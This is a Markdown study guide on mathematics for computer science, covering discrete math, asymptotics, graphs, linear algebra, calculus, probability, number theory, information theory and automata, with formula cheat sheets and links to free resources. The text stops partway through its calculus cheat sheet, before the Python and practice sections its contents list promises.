# 🧮 CS-Math-Essentials: The Complete All-in-One Reference

> **A complete, single-document master guide to the Mathematics behind Computer Science — combining curriculum roadmaps, deep-dive explanations, formula & proof cheat sheets, runnable Python implementations with verified outputs, exam-style practice problems with step-by-step solutions, and curated free books, university courses, and interactive visualizers.**

[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](#license)
[![Python 3.8+](https://img.shields.io/badge/Python-3.8%2B-yellow.svg)](#part-iii-complete-python-implementations--verified-outputs)
[![Format: All-in-One](https://img.shields.io/badge/Document-Single--File%20Master%20Edition-brightgreen.svg)](#-master-table-of-contents)

---

## 🧭 Master Table of Contents

- [📖 Overview & CS Mathematics Roadmap by Track](#-overview--cs-mathematics-roadmap-by-track)
- **Part I: Core Curriculum & Topic Deep Dives**
  - [1. Discrete Mathematics & Mathematical Logic](#1-discrete-mathematics--mathematical-logic)
  - [2. Asymptotics, Recurrences & Algorithmic Analysis](#2-asymptotics-recurrences--algorithmic-analysis)
  - [3. Graph Theory & Combinatorics](#3-graph-theory--combinatorics)
  - [4. Linear Algebra](#4-linear-algebra)
  - [5. Calculus & Continuous Optimization](#5-calculus--continuous-optimization)
  - [6. Probability Theory & Statistics](#6-probability-theory--statistics)
  - [7. Number Theory & Abstract Algebra](#7-number-theory--abstract-algebra)
  - [8. Information Theory & Coding Theory](#8-information-theory--coding-theory)
  - [9. Automata, Formal Languages & Computability](#9-automata-formal-languages--computability)
- **Part II: Complete Formula & Proof Cheat Sheets**
  - [Cheat Sheet 01: Discrete Mathematics, Logic & Proof Templates](#cheat-sheet-01-discrete-mathematics-logic--proof-templates)
  - [Cheat Sheet 02: Linear Algebra for Computer Science](#cheat-sheet-02-linear-algebra-for-computer-science)
  - [Cheat Sheet 03: Calculus, Automatic Differentiation & Optimization](#cheat-sheet-03-calculus-automatic-differentiation--optimization)
  - [Cheat Sheet 04: Probability Theory & Statistics for CS](#cheat-sheet-04-probability-theory--statistics-for-cs)
  - [Cheat Sheet 05: Number Theory, Abstract Algebra & Cryptography](#cheat-sheet-05-number-theory-abstract-algebra--cryptography)
  - [Cheat Sheet 06: LaTeX Math Symbols & Notation Lookup](#cheat-sheet-06-latex-math-symbols--notation-lookup)
- **Part III: Complete Python Implementations & Verified Outputs**
  - [Module 01: Discrete Math, Combinatorics & Graph Algorithms (`01_discrete_math_and_graphs.py`)](#module-01-discrete-math-combinatorics--graph-algorithms)
  - [Module 02: Linear Algebra, Gaussian Elimination & PageRank (`02_linear_algebra_from_scratch.py`)](#module-02-linear-algebra-gaussian-elimination--pagerank)
  - [Module 03: Numerical Calculus, Newton-Raphson & Gradient Descent (`03_calculus_and_gradient_descent.py`)](#module-03-numerical-calculus-newton-raphson--gradient-descent)
  - [Module 04: Bayesian Inference, Monte Carlo & Coupon Collector (`04_probability_and_monte_carlo.py`)](#module-04-bayesian-inference-monte-carlo--coupon-collector)
  - [Module 05: Primes, Extended GCD & End-to-End RSA Cryptosystem (`05_number_theory_and_crypto.py`)](#module-05-primes-extended-gcd--end-to-end-rsa-cryptosystem)
- **Part IV: Practice Problems & Step-by-Step Solutions**
  - [Problems 1–6: Induction, Master Theorem, Graphs, Eigenvalues, Hashing & Modular Arithmetic](#part-iv-practice-problems--step-by-step-solutions)
- **Part V: Additional Resources, Interactive Platforms & Study Guide**
  - [Interactive Visualizers & Problem Platforms](#interactive-visualizers--problem-platforms)
  - [Essential YouTube Channels](#essential-youtube-channels)
  - [Mathematical Software & Python Libraries](#mathematical-software--python-libraries)
  - [How to Read & Write Mathematical Proofs](#how-to-read--write-mathematical-proofs)

---

## 📖 Overview & CS Mathematics Roadmap by Track

Many Computer Science students ask: *"How much math do I actually need for CS, and how does it connect to writing code?"*

This document bridges the gap between **abstract mathematical theory** and **practical computer science**. Every mathematical topic is paired with concrete CS applications, essential formulas, runnable Python code, and curated free learning resources.

| Math Domain | Software Engineering & Systems | Algorithms & Competitive Programming | AI, Machine Learning & Data Science | Cryptography & Cybersecurity | Computer Graphics, Vision & Game Dev |
| :--- | :---: | :---: | :---: | :---: | :---: |
| **Boolean Logic & Sets** | 🔥 Essential | 🔥 Essential | ✅ Core | 🔥 Essential | ✅ Core |
| **Discrete Math & Proofs** | 🔥 Essential | 🔥 Essential | ✅ Core | 🔥 Essential | ✅ Core |
| **Graph Theory & Trees** | 🔥 Essential | 🔥 Essential | ✅ Core | ✅ Core | ✅ Core |
| **Combinatorics** | ✅ Core | 🔥 Essential | ✅ Core | ✅ Core | ➕ Helpful |
| **Linear Algebra** | ➕ Helpful | ➕ Helpful | 🔥 Essential | ✅ Core | 🔥 Essential |
| **Multivariable Calculus** | ➖ Optional | ➕ Helpful | 🔥 Essential | ➖ Optional | 🔥 Essential |
| **Probability & Statistics** | ✅ Core | ✅ Core | 🔥 Essential | ✅ Core | ✅ Core |
| **Number Theory & Algebra** | ➕ Helpful | 🔥 Essential | ➖ Optional | 🔥 Essential | ➖ Optional |
| **Numerical Optimization** | ➕ Helpful | ✅ Core | 🔥 Essential | ➖ Optional | 🔥 Essential |

---

# Part I: Core Curriculum & Topic Deep Dives

---

## 1. Discrete Mathematics & Mathematical Logic

[🔙 Back to Top](#-master-table-of-contents)

Discrete mathematics is the **native language of Computer Science**. Unlike continuous math (calculus), discrete math deals with distinct, countable structures: bits, integers, logic gates, sets, and state transitions.

### Why CS Students Need It
* **Boolean Algebra & Propositional Logic:** Digital circuit design, conditional branching (`if/else`), SAT solvers, and formal verification.
* **Relational Algebra & Set Theory:** SQL joins, database normalization, and type systems.
* **Mathematical Induction:** Proving that recursive functions and loops terminate and produce the right answer (loop invariants).

### Core Topics Checklist
- [ ] **Propositional Logic:** Truth tables, logical equivalences, De Morgan's Laws:
  $$\neg(P \land Q) \equiv (\neg P) \lor (\neg Q), \quad \neg(P \lor Q) \equiv (\neg P) \land (\neg Q)$$
- [ ] **Predicate Logic:** Universal ($\forall$) and Existential ($\exists$) quantifiers, negating quantified statements.
- [ ] **Proof Techniques:** Direct proof, proof by contrapositive ($P \implies Q \equiv \neg Q \implies \neg P$), proof by contradiction, and Weak/Strong Mathematical Induction.
- [ ] **Sets, Relations & Functions:** Power sets ($\mathcal{P}(S)$ has size $2^{|S|}$), Cartesian products, equivalence relations (reflexive, symmetric, transitive), partial orders (posets), injections, surjections, and bijections.

### Math-to-Code Connection
| Mathematical Notation | Python Equivalent |
| :--- | :--- |
| $\forall x \in S, P(x)$ | `all(P(x) for x in S)` |
| $\exists x \in S, P(x)$ | `any(P(x) for x in S)` |
| $A \cup B, \; A \cap B, \; A \setminus B$ | `A \| B`, `A & B`, `A - B` |
| $\{f(x) \mid x \in S \land P(x)\}$ | `{f(x) for x in S if P(x)}` |

### Curated Resources
* 📘 **Book (Free):** [*Mathematics for Computer Science* (MIT 6.042J) — Lehman, Leighton & Meyer](https://ocw.mit.edu/courses/6-042j-mathematics-for-computer-science-spring-2015/pages/readings/) — The gold-standard CS math textbook.
* 📘 **Book (Free):** [*Book of Proof* — Richard Hammack](https://www.people.vcu.edu/~rhammack/BookOfProof/) — Best gentle introduction to writing mathematical proofs.
* 📘 **Book (Free):** [*Discrete Mathematics: An Open Introduction* — Oscar Levin](https://discrete.openmathbooks.org/dmoi3.html)
* 🎓 **Course:** [MIT 6.042J: Mathematics for Computer Science (Video Lectures + Assignments)](https://ocw.mit.edu/courses/6-042j-mathematics-for-computer-science-spring-2015/)
* 🎥 **YouTube Playlist:** [TrevTutor — Discrete Math 1 & 2](https://www.youtube.com/c/Trevtutor)

---

## 2. Asymptotics, Recurrences & Algorithmic Analysis

[🔙 Back to Top](#-master-table-of-contents)

Before optimizing code, you need the mathematical tools to measure how runtime and memory scale as input size $n \to \infty$.

### Why CS Students Need It
* **Big-O, Big-Omega, Big-Theta:** Comparing sorting, searching, and graph algorithms independent of hardware.
* **Recurrence Relations:** Analyzing divide-and-conquer algorithms like Merge Sort, QuickSort, Karatsuba multiplication, and Fast Fourier Transform (FFT).
* **Summations & Series:** Calculating exact work done by nested loops and tree traversals.

### Essential Formulas
* **Arithmetic Series:** $\sum_{i=1}^{n} i = \frac{n(n+1)}{2} = \Theta(n^2)$
* **Geometric Series:** $\sum_{i=0}^{k} r^i = \frac{r^{k+1}-1}{r-1}$ (For $0 < r < 1$, $\sum_{i=0}^{\infty} r^i = \frac{1}{1-r}$)
* **Harmonic Series:** $H_n = \sum_{i=1}^{n} \frac{1}{i} = \ln(n) + \gamma + O\left(\frac{1}{n}\right) = \Theta(\log n)$
* **Stirling's Approximation:** $\log_2(n!) = \Theta(n \log n)$ (proves the $\Omega(n \log n)$ comparison sorting lower bound!)
* **Master Theorem:** For $T(n) = aT(n/b) + f(n)$ where $a \ge 1, b > 1$, let $c_{\text{crit}} = \log_b a$:
  1. If $f(n) = O(n^{c})$ for $c < c_{\text{crit}}$, then $T(n) = \Theta(n^{\log_b a})$.
  2. If $f(n) = \Theta(n^{c_{\text{crit}}} \log^k n)$, then $T(n) = \Theta(n^{\log_b a} \log^{k+1} n)$.
  3. If $f(n) = \Omega(n^{c})$ for $c > c_{\text{crit}}$ (and regularity holds), then $T(n) = \Theta(f(n))$.

### Curated Resources
* 📘 **Book:** *Concrete Mathematics: A Foundation for Computer Science* — Graham, Knuth & Patashnik
* 🎓 **Course:** [MIT 6.006: Introduction to Algorithms](https://ocw.mit.edu/courses/6-006-introduction-to-algorithms-spring-2020/)
* 🌐 **Reference:** [Big-O Cheat Sheet](https://www.bigocheatsheet.com/)

---

## 3. Graph Theory & Combinatorics

[🔙 Back to Top](#-master-table-of-contents)

### Why CS Students Need It
* **Graph Theory:** Internet routing (BGP/OSPF), social networks, compiler register allocation (graph coloring), dependency resolution (topological sort), and dependency graphs in build systems.
* **Combinatorics:** Counting the size of search spaces, password entropy, hash collisions (Pigeonhole Principle), and dynamic programming state counting.

### Core Topics Checklist
- [ ] **Counting Principles:** Product rule, Sum rule, Inclusion-Exclusion Principle ($|A \cup B| = |A| + |B| - |A \cap B|$), Pigeonhole Principle.
- [ ] **Permutations & Combinations:**
  $$P(n, k) = \frac{n!}{(n-k)!}, \qquad \binom{n}{k} = \frac{n!}{k!(n-k)!}$$
- [ ] **Catalan Numbers:** $C_n = \frac{1}{n+1}\binom{2n}{n}$ — counts valid parenthesis expressions, binary search trees with $n$ keys, and polygon triangulations.
- [ ] **Graph Fundamentals:** Handshaking Lemma ($\sum_{v \in V} \deg(v) = 2|E|$), bipartite graphs, DAGs, Eulerian & Hamiltonian paths, planar graphs ($|V| - |E| + |F| = 2$), spanning trees, and network flows (Max-Flow Min-Cut Theorem).

### Curated Resources
* 📘 **Book (Free):** [*Graph Theory* — Reinhard Diestel](https://diestel-graph-theory.com/)
* 🌐 **Interactive Tool:** [VisuAlgo — Graph & Tree Algorithm Visualizations](https://visualgo.net/en)
* 🌐 **Interactive Tool:** [D3 Graph Theory — Interactive Graph Theory Tutorials](https://d3gt.com/)

---

## 4. Linear Algebra

[🔙 Back to Top](#-master-table-of-contents)

Linear algebra is the engine behind **Machine Learning, Deep Learning, Computer Graphics, Data Compression, and Quantum Computing**.

### Why CS Students Need It
* **AI & Deep Learning:** Neural networks are sequences of matrix multiplications ($Wx + b$) followed by non-linear activations.
* **Computer Graphics & Game Engines:** 3D translation, scaling, rotation, and camera perspective projection are $4 \times 4$ homogeneous matrix transformations.
* **Search & Data Mining:** Google's PageRank algorithm finds the dominant eigenvector of the web link matrix; Singular Value Decomposition (SVD) powers recommender systems and image compression.

### Core Topics Checklist
- [ ] **Vectors & Spaces:** Dot product ($u \cdot v = \|u\|\|v\|\cos\theta$), cross product, vector norms ($L_1, L_2, L_\infty$), linear independence, span, basis, dimension, and rank.
- [ ] **Matrix Operations & Systems:** Matrix multiplication, transpose, inverse, determinant, Gaussian elimination (LU decomposition), and the Rank-Nullity Theorem ($\text{rank}(A) + \text{nullity}(A) = n$).
- [ ] **Orthogonality & Projections:** Orthonormal bases, Gram-Schmidt process, Least Squares approximation ($\hat{x} = (A^T A)^{-1} A^T b$).
- [ ] **Eigenvalues & Eigenvectors:** $Av = \lambda v$, characteristic polynomial $\det(A - \lambda I) = 0$, spectral theorem for symmetric matrices.
- [ ] **Matrix Decompositions:** Singular Value Decomposition ($A = U \Sigma V^T$) and Principal Component Analysis (PCA).

### Curated Resources
* 🎥 **Must-Watch Video Series:** [3Blue1Brown — *Essence of Linear Algebra*](https://www.youtube.com/playlist?list=PLZHQObOWTQDPD3MizzM2xVFitgF8hE_ab)
* 🎓 **Course:** [MIT 18.06: Linear Algebra — Prof. Gilbert Strang](https://ocw.mit.edu/courses/18-06-linear-algebra-spring-2010/)
* 📘 **Book (Free):** [*Linear Algebra Done Wrong* — Sergei Treil](https://www.math.brown.edu/streil/papers/LADW/LADW.html)
* 📘 **Book (Free):** [*Mathematics for Machine Learning* — Deisenroth, Faisal & Ong](https://mml-book.github.io/)
* 🌐 **Interactive Book:** [Immersive Linear Algebra](https://immersivemath.com/ila/index.html)

---

## 5. Calculus & Continuous Optimization

[🔙 Back to Top](#-master-table-of-contents)

While core algorithms are discrete, **training machine learning models, physics simulations, signal processing, and robotics** rely on continuous calculus and optimization.

### Why CS Students Need It
* **Backpropagation in Neural Networks:** Simply the multivariable **Chain Rule** applied efficiently via dynamic programming (reverse-mode automatic differentiation).
* **Gradient Descent:** Finding minimum loss by stepping opposite the gradient: $\theta_{t+1} = \theta_t - \eta \nabla L(\theta_t)$.
* **Taylor Series & Numerical Approximations:** Approximating transcendental functions ($\sin x, e^x, \ln x$) in CPU/GPU hardware and analyzing second-order optimization (Newton's method).

### Core Topics Checklist
- [ ] **Single-Variable Essentials:** Limits, L'Hôpital's Rule (vital for comparing asymptotic growth rates!), derivatives, chain rule, integration by parts, Taylor series.
- [ ] **Multivariable Calculus:** Partial derivatives ($\frac{\partial f}{\partial x_i}$), the Gradient vector ($\nabla f$), directional derivatives, the Jacobian matrix ($J$), and the Hessian matrix ($H$).
- [ ] **Optimization:** Convex sets and convex functions, local vs. global minima, Lagrange multipliers, Karush-Kuhn-Tucker (KKT) conditions, and stochastic gradient descent (SGD, Momentum, Adam).

### Curated Resources
* 🎥 **Video Series:** [3Blue1Brown — *Essence of Calculus*](https://www.youtube.com/playlist?list=PLZHQObOWTQDMsr9K-rj53DwVRMYO3t5Yr)
* 🎓 **Course:** [MIT 18.01 (Single Variable)](https://ocw.mit.edu/courses/18-01sc-single-variable-calculus-fall-2010/) & [MIT 18.02 (Multivariable Calculus)](https://ocw.mit.edu/courses/18-02sc-multivariable-calculus-fall-2010/)
* 📘 **Paper (Free):** [*The Matrix Calculus You Need For Deep Learning* — Parr & Howard](https://explained.ai/matrix-calculus/)
* 📘 **Book (Free):** [*Convex Optimization* — Stephen Boyd & Lieven Vandenberghe (Stanford)](https://web.stanford.edu/~boyd/cvxbook/)

---

## 6. Probability Theory & Statistics

[🔙 Back to Top](#-master-table-of-contents)

Modern computer science is increasingly probabilistic: from randomized algorithms and hash tables to A/B testing, distributed systems reliability, and Large Language Models.

### Why CS Students Need It
* **Randomized Algorithms & Data Structures:** QuickSort pivot selection, Skip Lists, Bloom Filters, Count-Min Sketch, and locality-sensitive hashing (LSH).
* **Machine Learning & AI:** Naive Bayes classifiers, Hidden Markov Models (HMMs), diffusion models, and token sampling in LLMs.
* **Systems & Networking:** Queueing theory, packet loss modeling, cache hit rates, and tail-latency SLAs ($p95, p99$).

### Core Topics Checklist
- [ ] **Foundations:** Conditional probability $P(A \mid B) = \frac{P(A \cap B)}{P(B)}$, Law of Total Probability, and **Bayes' Theorem**:
  $$P(H \mid E) = \frac{P(E \mid H) P(H)}{P(E)}$$
- [ ] **Random Variables & Moments:** Expectation $E[X]$, Linearity of Expectation ($E[X+Y] = E[X] + E[Y]$ even if $X, Y$ are dependent!), Variance $\text{Var}(X) = E[X^2] - (E[X])^2$, Covariance, and Correlation.
- [ ] **Key Distributions:**
  * *Discrete:* Bernoulli, Binomial, Geometric, Poisson, Zipf.
  * *Continuous:* Uniform, Normal (Gaussian), Exponential.
- [ ] **Limit Theorems & Bounds:** Markov's Inequality, Chebyshev's Inequality, Chernoff Bounds, Law of Large Numbers, and Central Limit Theorem (CLT).
- [ ] **Statistical Inference:** Maximum Likelihood Estimation (MLE), Maximum A Posteriori (MAP), confidence intervals, p-values, and Markov Chains.

### Curated Resources
* 🌐 **Interactive Visual Guide:** [Seeing Theory — A Visual Introduction to Probability and Statistics (Brown University)](https://seeing-theory.brown.edu/)
* 🎓 **Course:** [Harvard Stat 110: Probability — Prof. Joe Blitzstein (YouTube + Free Book)](https://projects.iq.harvard.edu/stat110/home)
* 🎓 **Course:** [Stanford CS109: Probability for Computer Scientists](https://web.stanford.edu/class/cs109/)
* 📘 **Book (Free):** [*Introduction to Probability, Statistics, and Random Processes* — Hossein Pishro-Nik](https://www.probabilitycourse.com/)
* 🎥 **YouTube Channel:** [StatQuest with Josh Starmer](https://www.youtube.com/c/joshstarmer)

---

## 7. Number Theory & Abstract Algebra

[🔙 Back to Top](#-master-table-of-contents)

Once considered the "purest" branch of mathematics with no practical use, Number Theory and Abstract Algebra now secure the entire internet.

### Why CS Students Need It
* **Public-Key Cryptography:** RSA, Diffie-Hellman key exchange, and Elliptic Curve Cryptography (ECDSA/Ed25519 used in TLS, SSH, and cryptocurrencies).
* **Hashing & Checksums:** Cyclic Redundancy Checks (CRC32) and AES encryption operate over Finite Fields $GF(2^8)$.
* **Zero-Knowledge Proofs:** zk-SNARKs and zk-STARKs rely on polynomials over finite fields and elliptic curve pairings.

### Core Topics Checklist
- [ ] **Divisibility & Primes:** Fundamental Theorem of Arithmetic, Sieve of Eratosthenes, Euclidean Algorithm for $\gcd(a, b)$ in $O(\log(\min(a,b)))$ time.
- [ ] **Extended Euclidean Algorithm:** Finding integers $x, y$ such that $ax + by = \gcd(a, b)$ (Bézout's Identity) — used to compute modular inverses $a^{-1} \bmod m$.
- [ ] **Modular Arithmetic:** Congruences ($a \equiv b \pmod m$), fast modular exponentiation ($a^b \bmod m$ via binary exponentiation), Chinese Remainder Theorem (CRT).
- [ ] **Key Theorems:**
  * **Fermat's Little Theorem:** If $p$ is prime and $p \nmid a$, then $a^{p-1} \equiv 1 \pmod p$.
  * **Euler's Theorem:** If $\gcd(a, n) = 1$, then $a^{\phi(n)} \equiv 1 \pmod n$.
- [ ] **Abstract Algebra Basics:** Groups, Abelian groups, cyclic groups, generators, Rings, and Finite Fields (Galois Fields $GF(p^n)$).

### Curated Resources
* 🌐 **Interactive Gamified Platform:** [CryptoHack — Learn Modern Cryptography by Solving Challenges](https://cryptohack.org/)
* 📘 **Book (Free):** [*A Computational Introduction to Number Theory and Algebra* — Victor Shoup](https://shoup.net/ntb/)
* 📘 **Book (Free):** [*A Graduate Course in Applied Cryptography* — Dan Boneh & Victor Shoup](https://toc.cryptobook.us/)
* 📘 **Book (Free):** [*Abstract Algebra: Theory and Applications* — Thomas W. Judson](http://abstract.ups.edu/)

---

## 8. Information Theory & Coding Theory

[🔙 Back to Top](#-master-table-of-contents)

Founded by Claude Shannon in 1948, Information Theory answers two fundamental questions in CS:
1. What is the ultimate limit of lossless data compression? (**Shannon Entropy**)
2. What is the ultimate rate of reliable communication over a noisy channel? (**Channel Capacity**)

### Key Formulas & CS Applications
* **Shannon Entropy:** Measures the average bits of information (or surprise) per symbol:
  $$H(X) = -\sum_{x \in \mathcal{X}} P(x) \log_2 P(x)$$
  *Applications:* Decision tree splitting (Information Gain), data compression (Huffman & Arithmetic coding).
* **Cross-Entropy & KL Divergence:**
  $$H(P, Q) = -\sum_{x} P(x) \log Q(x), \qquad D_{\text{KL}}(P \parallel Q) = \sum_{x} P(x) \log\left(\frac{P(x)}{Q(x)}\right)$$
  *Applications:* The loss function used to train virtually every classification neural network and Large Language Model.
* **Error-Correcting Codes:** Hamming codes (ECC RAM), Reed-Solomon codes (QR codes, RAID 6, deep-space communication).

### Curated Resources
* 📘 **Book (Free):** [*Information Theory, Inference, and Learning Algorithms* — David J.C. MacKay](https://www.inference.org.uk/itprnn/book.pdf)
* 🎥 **Video:** [Khan Academy — Journey into Information Theory](https://www.khanacademy.org/computing/computer-science/informationtheory)

---

## 9. Automata, Formal Languages & Computability

[🔙 Back to Top](#-master-table-of-contents)

This is where mathematics defines **what a computer is** and **what problems can or cannot be solved by any algorithm**.

### Core Topics Checklist (The Chomsky Hierarchy)
1. **Regular Languages $\leftrightarrow$ Finite Automata (DFA/NFA) & Regular Expressions:** Used in lexical analyzers (lexers), network packet filters, and text search (`grep`).
2. **Context-Free Languages $\leftrightarrow$ Pushdown Automata & Context-Free Grammars (CFGs):** Used in programming language parsers (AST generation) and compilers.
3. **Decidable & Turing-Recognizable Languages $\leftrightarrow$ Turing Machines:** The mathematical model of general-purpose computation.
4. **Undecidability & Complexity Classes:** Cantor's diagonalization, the **Halting Problem**, $\text{P}$ vs. $\text{NP}$, NP-Completeness, and Cook-Levin reductions.

### Curated Resources
* 📘 **Classic Textbook:** *Introduction to the Theory of Computation* — Michael Sipser
* 🌐 **Interactive Sandbox:** [Automaton Simulator / FSM Designer](https://madebyevan.com/fsm/)
* 🎓 **Course:** [MIT 18.404J / 6.840J: Theory of Computation — Prof. Michael Sipser (Lectures on YouTube)](https://ocw.mit.edu/courses/18-404j-theory-of-computation-fall-2020/)

---

# Part II: Complete Formula & Proof Cheat Sheets

---

## Cheat Sheet 01: Discrete Mathematics, Logic & Proof Templates

[🔙 Back to Top](#-master-table-of-contents)

### 1.1 Propositional Logic Equivalences

| Law Name | Equivalence |
| :--- | :--- |
| **Implication Law** | $P \implies Q \;\equiv\; \neg P \lor Q$ |
| **Contrapositive** | $P \implies Q \;\equiv\; \neg Q \implies \neg P$ |
| **Biconditional** | $P \iff Q \;\equiv\; (P \implies Q) \land (Q \implies P)$ |
| **De Morgan's Laws** | $\neg(P \land Q) \equiv \neg P \lor \neg Q$ <br> $\neg(P \lor Q) \equiv \neg P \land \neg Q$ |
| **Distributive Laws** | $P \land (Q \lor R) \equiv (P \land Q) \lor (P \land R)$ <br> $P \lor (Q \land R) \equiv (P \lor Q) \land (P \lor R)$ |
| **Negating Quantifiers** | $\neg(\forall x \, P(x)) \equiv \exists x \, \neg P(x)$ <br> $\neg(\exists x \, P(x)) \equiv \forall x \, \neg P(x)$ |

### 1.2 Standard Proof Templates for CS Exams & Algorithms

* **Direct Proof ($P \implies Q$):**
  1. Assume $P$ is true.
  2. Unpack definitions of terms in $P$.
  3. Use algebraic/logical steps to derive $Q$.
  4. Conclude $P \implies Q$. $\blacksquare$
* **Proof by Contrapositive ($P \implies Q$):**
  1. State that we prove the contrapositive: $\neg Q \implies \neg P$.
  2. Assume $\neg Q$ is true and deduce $\neg P$.
  3. Since the contrapositive is logically equivalent to the original claim, $P \implies Q$. $\blacksquare$
* **Proof by Contradiction:**
  1. Suppose for the sake of contradiction that the claim $S$ is false ($\neg S$ holds).
  2. Derive a logical contradiction $C \land \neg C$.
  3. Conclude $\neg S$ is false, so $S$ is true. $\blacksquare$
* **Mathematical Induction ($\forall n \ge n_0, \, P(n)$):**
  1. **Predicate:** Define $P(n)$ clearly as a statement about $n$.
  2. **Base Case ($n = n_0$):** Verify that $P(n_0)$ holds directly.
  3. **Inductive Hypothesis (IH):** Assume $P(k)$ holds for an arbitrary integer $k \ge n_0$ *(or for Strong Induction: assume $P(j)$ holds for all $n_0 \le j \le k$)*.
  4. **Inductive Step:** Prove $P(k+1)$ using the Inductive Hypothesis.
  5. **Conclusion:** By Mathematical Induction, $P(n)$ holds for all $n \ge n_0$. $\blacksquare$

### 1.3 Set Theory & Relations Quick Reference
* **Power Set:** $\mathcal{P}(A)$ is the set of all subsets of $A$. $|\mathcal{P}(A)| = 2^{|A|}$.
* **Cartesian Product:** $A \times B = \{(a, b) \mid a \in A \land b \in B\}$. $|A \times B| = |A| \cdot |B|$.
* **Properties of a Binary Relation $R \subseteq A \times A$:**
  * **Reflexive:** $\forall a \in A, \, (a, a) \in R$
  * **Symmetric:** $\forall a, b \in A, \, (a, b) \in R \implies (b, a) \in R$
  * **Antisymmetric:** $\forall a, b \in A, \, (a, b) \in R \land (b, a) \in R \implies a = b$
  * **Transitive:** $\forall a, b, c \in A, \, (a, b) \in R \land (b, c) \in R \implies (a, c) \in R$
* **Equivalence Relation:** Reflexive + Symmetric + Transitive (partitions $A$ into disjoint equivalence classes).
* **Partial Order (Poset):** Reflexive + Antisymmetric + Transitive (can be topologically sorted if finite!).

### 1.4 Combinatorics: The Four-Way Counting Table

| Order Matters? | Repetition Allowed? | Formula | CS Example |
| :---: | :---: | :---: | :--- |
| **Yes** (Sequence) | **Yes** | $n^k$ | Number of $k$-character strings from an alphabet of size $n$ (e.g., $2^k$ bitstrings) |
| **Yes** (Permutation) | **No** | $P(n, k) = \frac{n!}{(n-k)!}$ | Assigning $k$ distinct tasks to $k$ out of $n$ servers |
| **No** (Combination) | **No** | $\binom{n}{k} = \frac{n!}{k!(n-k)!}$ | Choosing a subset of $k$ nodes from an $n$-node cluster |
| **No** (Multiset / Stars & Bars) | **Yes** | $\binom{n + k - 1}{k}$ | Distributing $k$ identical jobs across $n$ distinct workers |

### 1.5 Graph Theory Identities
* **Handshaking Lemma:** In any undirected graph $G = (V, E)$, $\sum_{v \in V} \deg(v) = 2|E|$.
* **Trees ($n = |V|$ vertices):** Connected and acyclic $\iff$ connected with $n - 1$ edges $\iff$ unique path between every pair of vertices.
* **Cayley's Formula:** Number of labeled trees on $n$ vertices is $n^{n-2}$.
* **Euler's Planar Graph Formula:** $V - E + F = 2$, and for $V \ge 3$, $E \le 3V - 6$.

---

## Cheat Sheet 02: Linear Algebra for Computer Science

[🔙 Back to Top](#-master-table-of-contents)

### 2.1 Vectors, Norms & Inner Products
Given $u, v \in \mathbb{R}^n$:
* **Dot Product:** $u \cdot v = u^T v = \sum_{i=1}^n u_i v_i = \|u\|_2 \|v\|_2 \cos\theta$
* **Cosine Similarity:** $\text{sim}(u, v) = \cos\theta = \frac{u \cdot v}{\|u\|_2 \|v\|_2} \in [-1, 1]$
* **Vector Norms:**
  * **$L_1$ (Manhattan):** $\|x\|_1 = \sum_{i=1}^n |x_i|$
  * **$L_2$ (Euclidean):** $\|x\|_2 = \sqrt{\sum_{i=1}^n x_i^2} = \sqrt{x^T x}$
  * **$L_\infty$ (Max Norm):** $\|x\|_\infty = \max_i |x_i|$

### 2.2 Matrix Properties & Subspaces
For $A \in \mathbb{R}^{m \times n}$:
* **Matrix Multiplication:** $(AB)_{ij} = \sum_{k=1}^n A_{ik} B_{kj}$, $(AB)^T = B^T A^T$, $(AB)^{-1} = B^{-1} A^{-1}$.
* **Trace & Determinant:** $\text{Tr}(A) = \sum_{i=1}^n A_{ii} = \sum_{i=1}^n \lambda_i$; $\det(A) = \prod_{i=1}^n \lambda_i$.
* **Rank-Nullity Theorem:** $\text{rank}(A) + \text{dim}(\text{Null}(A)) = n$.

### 2.3 Eigendecomposition & Singular Value Decomposition (SVD)
* **Eigenvalues & Eigenvectors:** $Av = \lambda v$, found via $\det(A - \lambda I) = 0$.
* **Diagonalization:** $A = P \Lambda P^{-1} \implies A^k = P \Lambda^k P^{-1}$.
* **Spectral Theorem (Symmetric $A = A^T$):** $A = Q \Lambda Q^T$ with real eigenvalues and orthonormal eigenvectors ($Q^T Q = I$).
* **Singular Value Decomposition (Any $m \times n$ matrix):**
  $$A = U \Sigma V^T$$
  where $U \in \mathbb{R}^{m \times m}$ and $V \in \mathbb{R}^{n \times n}$ are orthogonal, and $\Sigma$ contains non-negative singular values $\sigma_i = \sqrt{\lambda_i(A^T A)}$.

### 2.4 2D Homogeneous Graphics Transformation Matrix
$$\begin{bmatrix} x' \\ y' \\ 1 \end{bmatrix} = \begin{bmatrix} s_x \cos\theta & -s_y \sin\theta & t_x \\ s_x \sin\theta & s_y \cos\theta & t_y \\ 0 & 0 & 1 \end{bmatrix} \begin{bmatrix} x \\ y \\ 1 \end{bmatrix}$$

---

## Cheat Sheet 03: Calculus, Automatic Differentiation & Optimization

[🔙 Back to Top](#-master-table-of-contents)

### 3.1 Essential Derivatives Table

| Function $f(x)$ | Derivative $f'(x)$ | CS Relevance |
| :--- | :--- | :--- |
| $x^n$ | $n x^{n-1}$ | Polynomial loss functions |
| $e^x$ / $a^x$ | $e^x$ / $a^x \ln(a)$ | Softmax & exponential growth |
| $\ln(x)$ / $\log_2(x)$ | $\frac{1}{x}$ / $\frac{1}{x \ln(2)}$ | Cross-entropy loss & information entropy |
| $\sigma(x) = \frac{1}{1 + e^{-x}}$ | $\sigma(x)(1 - \sigma(x))$ | Logistic sigmoid activation |
| $\tanh(x)$ | $1 - \tanh^2(x)$ | Neural network activation |
| $\text{ReLU}(x) = \max(0, x)$ | $1 \text{ if } x > 0 \text{ else } 0$ | Standard deep learning activation |

### 3.2 Multivariable & Matrix Calculus
* **Gradient ($\nabla f \in \mathbb{R}^n$):** $\nabla f(x) = \left[\frac{\partial f}{\partial x_1}, \dots, \frac{\partial f}{\partial x_n}\right]^T$ (direction of steepest ascent).
* **Jacobian ($J \in \mathbb{R}^{m \times n}$):** $J_{ij} = \frac{\partial F_i}{\partial x_j}$.
* **Hessian ($H \in \mathbb{R}^{n \times n}$):** $H_{ij} = \frac{\partial^2 f}{\partial x_i \partial x_j}$.
* **Matrix Gradients:** $\nabla_x (a^T x) = a$, $\nabla_x (x^T A x) = (A + A^T)x$, $\nabla_x \|Ax - b\|_2^2 = 2A^T(Ax - b)$.

### 3.3 Optimization Update Rules
* **Gradient Descent:** $\theta_{t+1} = \theta_t - \eta \nabla L(\theta_t)$
* **Momentum:** $v_{t+1} = \beta v_t + \nabla L(\theta_t), \quad \theta_{t+1} = \theta_t - \eta v_{t+1}$
